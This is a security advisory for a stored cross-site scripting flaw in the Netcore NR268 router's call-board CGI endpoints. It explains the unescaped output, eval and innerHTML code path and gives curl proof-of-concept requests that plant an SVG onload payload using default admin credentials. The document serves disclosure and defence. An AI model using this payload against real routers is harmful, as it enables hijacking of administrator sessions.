# Netcore NR268 Stored Cross-Site Scripting in L7 Call-Board List Views

**Vendor:** Netcore  
**Product:** NR268 Router  
**Affected Version:** NR268-V1.7.121109.bin  
**Vulnerability Type:** Stored Cross-Site Scripting (XSS) (CWE-79)  
**Credits:** Zhou Ao, Zhang Yu, Yang Yang, Liu Xin @Nebusec

## Summary

Call-board setters store title, note, URL, and content fields without character filtering. The paired list routes serialize those values directly into JSON-like output with `%s`, and the web UI parses the response with `eval('('+data+')')`. A crafted stored URL such as `x'><svg/onload=alert(1)>` is later injected into warning-set row HTML through `innerHTML`. An authenticated attacker can persist that payload through `/router/l7_call_board_user_set.cgi` so it executes in the administrator browser when the warning-set list is opened.

## Technical Details

The setters copy attacker-controlled `name`, `text_url`, `text_name`, `info`, and `content` fields into the switch IPC struct with `strncpy` and no HTML/JavaScript escaping. The list routes emit those fields with raw `%s`. `DataRequest()` then runs `eval('('+data+')')`, and the warning-set page rebuilds row HTML as:

```
<a target=_blank href='http://' + text_name_url + '>' + text_name_url + '</a>
```

and injects it with `$("#warning_set_list").html(str)`. The stock UI does not validate `warning_url_text` before the request is sent, so the URL-backed warning path is reachable through the normal page.

### Affected Endpoint

- URL: `/router/l7_call_board_user_set.cgi`, `/router/l7_call_board_user_list.cgi`, `/router/l7_call_board_text_set.cgi`, `/router/l7_call_board_text_list.cgi`
- Parameters: `name`, `text_url`, `text_name`, `info`, `content`
- Method: POST
- Authentication: HTTP Basic authentication

## Proof of Concept

```bash
curl -s -u admin:admin -X POST "http://192.168.1.1/router/l7_call_board_user_set.cgi" \
  --data-urlencode "name=warning-1" \
  --data-urlencode "text_name=friendly" \
  --data-urlencode "text_url=x'><svg/onload=alert(1)>" \
  --data-urlencode "info=fwprobe" \
  --data-urlencode "content=url"

curl -s -u admin:admin -X POST "http://192.168.1.1/router/l7_call_board_user_list.cgi" \
  -d "noneed=noneed"
```

Open the warning-set list page in the administrator browser. The list renderer injects the stored URL into an `<a href='http://...'>` row via `innerHTML`.

### Outcome

The list CGI returns the unescaped `text_url`. The warning-set page evaluates the response with `eval` and writes the SVG payload into the table HTML, executing attacker JavaScript in the router origin.

## Impact

- **Confidentiality:** High
- **Integrity:** High
- **Availability:** Low

An authenticated attacker can persist JavaScript that executes when an administrator later opens the warning-set or warning-content pages.
